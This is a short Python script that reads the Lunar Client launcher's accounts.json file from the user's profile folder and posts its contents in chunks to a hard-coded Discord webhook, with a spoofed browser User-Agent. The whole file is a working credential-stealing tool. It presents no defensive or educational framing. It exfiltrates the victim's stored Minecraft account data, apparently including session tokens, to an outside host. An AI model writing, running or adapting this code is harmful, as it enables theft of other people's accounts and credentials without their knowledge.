import json
import os
import requests

accounts_path = os.path.join(os.environ["USERPROFILE"], ".lunarclient", "settings", "game", "accounts.json")
webhook_url = "https://discord.com/api/webhooks/1551261043991253055/pEvyDaQigP-bShTvVOs97f4NyVqo-RPgBz4z4XDOJGap0tXIvJ46gX7eZYkzTy2WrgeJ"

with open(accounts_path, "r", encoding="utf-8") as f:
    data = json.load(f)

text = json.dumps(data, indent=2, ensure_ascii=False)

CHUNK_SIZE = 1900
chunks = [text[i:i + CHUNK_SIZE] for i in range(0, len(text), CHUNK_SIZE)]

for idx, chunk in enumerate(chunks):
    payload = {"content": f"```\n{chunk}\n```"}
    resp = requests.post(webhook_url, json=payload, headers={"User-Agent": "Mozilla/5.0"})
    print(f"Chunk {idx + 1}/{len(chunks)} -> Status: {resp.status_code}")
    if resp.status_code not in (200, 204):
        print(resp.text)
        break
